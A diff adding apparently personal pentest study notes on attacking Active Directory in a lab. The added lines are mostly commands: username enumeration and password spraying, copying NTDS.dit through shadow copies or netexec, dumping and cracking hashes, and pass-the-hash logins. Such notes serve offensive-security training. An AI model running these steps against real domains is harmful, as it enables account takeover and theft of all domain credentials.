@@ -145,6 +145,34 @@ privilege::debug
 sekurlsa::credman  
 Lasagne is much simpler, jsut run exe - reveals cleartext pass..  
 
+**Attacking Active Directory and NTDS.dit**  
+Dictionary attack against AD accounts using netexec -- create a list of usernames from social media or something or custom  
+usernames --- sam not user principal names user principal names used in email  
+can use tool username-anarchy to convert real names into usernames ./username-anarchy -i /home/ltnbob/names.txt  
+Once we have a list of usernames, can verify their validity with kerbrute  
+./kerbrute_linux_amd64 userenum --dc 10.1.1.1 --domain test.local names.txt  
+Once we have valid users, can launch brute force using netexec but if there is password lockout policy then try spraying with few passwords  
+netexec smb 10.129.201.57 -u bwilliamson -p /usr/share/wordlists/fasttrack.txt  
+
+Capturing NTDS.dit - NT Directory services . dit directory information tree - primary DB file stored everything  
+stored at %systemroot%/ntds on the domain controllers It is very likely that NTDS will be stored on C:  
+the compromised account has domian admin rights which we can use to copy ntds.dit  
+can use vssadmin to do a volume shadow copy, copy volume c 
+we can;t directly copy the ntds.dit due to mandatory file lock hence create a show of volume and then copy it from the shadow copy  
+
+evil-winrm -i 10.129.201.57  -u bwilliamson -p 'P@55w0rd!'  
+C:\> vssadmin CREATE SHADOW /For=C:   //create a shoadow copy  
+C:\NTDS> cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit  //copy ntds from shadow copy  
+Now extract it to attacker machine say kali  
+impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL  //dump the hashes locally from ntds.dit file  
+
+Faster method to capture ntds.dit using netexec  //shadow copy steps waste of time  
+netexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! -M ntdsutil  
+
+Once hashes dumped, can use hashcat to crack the NT hashes  
+sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt  
+If no crack then pass the hashes using evil-winrm or netexec  
+evil-winrm -i 10.129.201.57 -u Administrator -H 64f12cddaa88057e06a81b54e73b949b  
 
 
 
